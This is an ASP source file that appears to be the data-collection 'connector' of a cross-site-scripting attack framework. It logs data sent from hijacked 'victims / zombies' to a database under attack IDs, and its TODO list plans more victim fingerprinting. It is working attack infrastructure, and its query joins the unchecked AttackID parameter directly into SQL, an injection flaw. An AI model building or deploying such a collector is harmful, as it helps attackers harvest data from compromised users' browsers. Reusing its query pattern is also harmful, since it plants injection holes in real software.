<%
'// CONNECTOR
' Save everything to database

'//HISTORY
'09/08/2006
'	- Started
'	- Response Codes

'10/08/2006
'	- AttackID Implementation
'	- Post/Querystrings changed for support different communication types

'//TODO
' - Add UNIQUE ID for victims / zombies
' - Gather more info about victim browser, language, Screen Res vs.
' - Remove Type and use commands for determine types
' - Accept Post Data for long stuff


%>
<!--#include file="db.asp" -->

<%
	Dim Data, DataType, AttackID
	Data = Request("d")
	DataType = fm_NStr(Request("t"))
	AttackID = fm_NStr(Request("a"))

	' Error / missing data
	If DataType = 0 Or Data = "" Then 
		Response.Write NON_ERROR
		Response.End
	End If
	

	'Always accept
	Dim AlwaysInsertNew 
	AlwaysInsertNew = ""

	If ( AttackID = BROADCAST_ATTACK ) Then 
		
		ACCEPT_EVERY_REQUEST = True
		AlwaysInsertNew = CStr(fm_RndNumeric(6646547))

	End If

	' Check Exist !
	Dim RsCheckAttackID, InsertNew
	getRs RsCheckAttackID, "SELECT TOP 1 * FROM Log WHERE AttackID = '" & AttackID & AlwaysInsertNew & "' ORDER BY ID DESC "
	
	'Log
	Dim values(8)
	values(0) = "Data"
	values(1) = Data
	values(2) = "text"
	values(3) = "Type"
	values(4) = DataType
	values(5) = "number"

	
	'Empty !
	If RsCheckAttackID.BOF And RsCheckAttackID.EOF Then
	
		' If empty and we dont accept not valid AttackID just exit
		If Not ACCEPT_EVERY_REQUEST Then
			Response.Write NON_ERROR

		'Accept not valid AttackIds
		Else
			
			' INSERT NEW
			values(6) = "AttackID"
			values(7) = AttackID
			values(8) = "text"

			fm_Insert "Log", values
			
			Response.Write SUCCESS

		End If
	
	Else
			
		values(6) = "ResponseTime"
		values(7) = Now()
		values(8) = "text"

		'Update Attack
		fm_Update "Log", "ID", RsCheckAttackID("ID"), values
		Response.Write SUCCESS
		

	End If
	
	fmKill RsCheckAttackID
%>